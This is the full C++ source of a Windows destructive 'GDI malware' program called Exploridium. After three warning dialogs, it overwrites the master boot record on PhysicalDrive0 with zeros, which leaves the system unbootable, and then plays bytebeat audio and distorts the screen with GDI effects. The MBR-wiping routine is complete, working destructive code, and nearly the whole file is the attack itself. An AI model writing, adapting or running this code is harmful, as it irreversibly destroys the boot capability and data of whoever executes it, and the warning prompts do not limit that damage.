#include <windows.h>
#include <mmsystem.h>
#include <math.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

unsigned int t = 0;
bool activo = true;
const int FASE_MUSTRAS = 330750; 

// --- DESTRUCTIVE CORE (CORRECTED) ---
void DestruirMBR() {
    DWORD wb;
    char mbrData[512] = { 0 }; 
    // Fill with 0s but keep the boot signature to "trick" the BIOS
    mbrData[510] = (char)0x55;
    mbrData[511] = (char)0xAA;

    // This MUST be run as Administrator
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    
    if (hDrive != INVALID_HANDLE_VALUE) {
        WriteFile(hDrive, mbrData, 512, &wb, NULL);
        CloseHandle(hDrive);
    } else {
        // If this happens, the destruction FAILED due to lack of admin rights
        MessageBoxA(NULL, "CRITICAL ERROR: Administrator privileges required to overwrite MBR.", "Exploridium Error", MB_ICONERROR);
    }
}

// --- STABLE AUDIO ENGINE (DOUBLE BUFFERING) ---
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int numBuffers = 2;
    const int bufferSize = 5512; 
    WAVEHDR header[numBuffers];
    char bData[numBuffers][bufferSize];

    for (int n = 0; n < numBuffers; n++) {
        ZeroMemory(&header[n], sizeof(WAVEHDR));
        header[n].lpData = bData[n];
        header[n].dwBufferLength = bufferSize;
    }

    int bufIdx = 0;
    while (activo && t < (FASE_MUSTRAS * 10)) {
        for (int i = 0; i < bufferSize; i++, t++) {
            if (t < FASE_MUSTRAS) bData[bufIdx][i] = (char)(t >> (((t % 2 ? t % ((t >> 13) % 8 >= 2 ? ((t >> 13) % 8 >= 4 ? 41 : 51) : 61) : t % 34))) | (~t >> 4));
            else if (t < FASE_MUSTRAS * 2) { int nse[] = { 48,50,52,53,55,57,59 }; bData[bufIdx][i] = (char)((nse[(t / 20) % 7] - 48) * 28 & t / 90 & -t / 91); }
            else if (t < FASE_MUSTRAS * 3) bData[bufIdx][i] = (char)(t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10));
            else if (t < FASE_MUSTRAS * 4) bData[bufIdx][i] = (char)(t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13) * t);
            else if (t < FASE_MUSTRAS * 5) bData[bufIdx][i] = (char)(15 - t % (t & 16384 ? 26 : 29) & t >> 4 | t << 1 & -t >> 4);
            else if (t < FASE_MUSTRAS * 6) bData[bufIdx][i] = (char)(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)));
            else if (t < FASE_MUSTRAS * 7) bData[bufIdx][i] = (char)(((t & 32767) >> 13 == 2 | (t & 65535) >> 12 == 9 ? (t ^ -(t / 8 & t >> 5) * (t / 8 & 127)) & (-(t >> 5) & 255) * ((t & 65535) >> 12 == 9 ? 2 : 1) : (t & 8191) % ((t >> 5 & 255 ^ 240) == 0 ? 1 : t >> 5 & 255 ^ 240)) / 4 * 3 + (t * 4 / (4 + (t >> 15 & 3)) & 128) * (-t >> 11 & 2) * ((t & 32767) >> 13 != 2) / 3);
            else if (t < FASE_MUSTRAS * 8) bData[bufIdx][i] = (char)((((t * (t & 16384 ? 7 : 5) * (3 - (3 & t >> 9) + (3 & t >> (-t >> 20 & 1 ? 8 : 11))) >> (3 & -t >> (t & (-t & 57344 ? 4096 : 6144) ? 2 : 16)) | (-t & 24576 ? (3 * t >> 5) % 192 : (t >> 4) % 192) | (t >> 20 & 1 ? t >> 4 : t >> (-t >> 18 & 1) + 2)) & 255) >> 1));
            else if (t < FASE_MUSTRAS * 9) { int a = (int)(30 * t * pow(1.059, (t >> 13) % 12)); bData[bufIdx][i] = (char)((a % 255 + a % 128 + a % 64 + a % 32) / 3); }
            else bData[bufIdx][i] = (char)((t * (t >> 8 | t >> 9) & 46 & t >> 8) ^ (t & t >> 13 | t >> 6));
        }

        waveOutPrepareHeader(hWaveOut, &header[bufIdx], sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header[bufIdx], sizeof(WAVEHDR));
        while (!(header[bufIdx].dwFlags & WHDR_DONE) && activo) Sleep(1);
        waveOutUnprepareHeader(hWaveOut, &header[bufIdx], sizeof(WAVEHDR));
        bufIdx = (bufIdx + 1) % numBuffers;
    }
    activo = false;
    waveOutClose(hWaveOut);
    return 0;
}

int main() {
    // Alerts
    if (MessageBoxA(NULL, "WARNING: This software is HIGHLY DESTRUCTIVE.\nProceed with execution?", "Safety Warning 1/3", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) return 0;
    if (MessageBoxA(NULL, "CRITICAL: The MBR will be erased. The system will NOT boot again.\nAre you sure?", "Critical Error 2/3", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) != IDYES) return 0;
    if (MessageBoxA(NULL, "FINAL WARNING: Irreversible damage will occur.\nContinue?", "System Termination 3/3", MB_YESNO | MB_ICONSTOP | MB_DEFBUTTON2) != IDYES) return 0;

    DestruirMBR(); // Execute the payload
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int tx = 0, ty = 0, dx = 15, dy = 15;

    while (activo) {
        HDC hdc = GetDC(NULL); 
        InvalidateRect(NULL, NULL, FALSE);

        if (t < FASE_MUSTRAS * 3) {
            for (int i = 0; i < sh; i += 4) {
                int offset = (int)(sin(t / 10.0 + i / 20.0) * 15);
                BitBlt(hdc, offset, i, sw, 4, hdc, 0, i, SRCCOPY);
            }
        }
        else if (t < FASE_MUSTRAS * 6) {
            StretchBlt(hdc, 15, 15, sw - 30, sh - 30, hdc, 0, 0, sw, sh, SRCCOPY);
            if (t % 1000 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT);
        }
        else if (t < FASE_MUSTRAS * 9) {
            POINT v[3];
            v[0].x = rand() % 40; v[0].y = rand() % 40;
            v[1].x = sw - rand() % 40; v[1].y = rand() % 40;
            v[2].x = rand() % 40; v[2].y = sh - rand() % 40;
            PlgBlt(hdc, v, hdc, 0, 0, sw, sh, 0, 0, 0);
            if (rand() % 5 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
        }
        else {
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            HFONT hFont = CreateFontA(120, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, "Impact");
            SelectObject(hdc, hFont);
            TextOutA(hdc, tx, ty, "EXPLORIDIUM", 11);
            tx += dx; ty += dy;
            if (tx < 0 || tx > sw - 450) dx = -dx;
            if (ty < 0 || ty > sh - 120) dy = -dy;
            BitBlt(hdc, rand() % 20 - 10, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCINVERT);
            DeleteObject(hFont);
        }

        ReleaseDC(NULL, hdc);
        Sleep(4); 
    }

    return 0;
}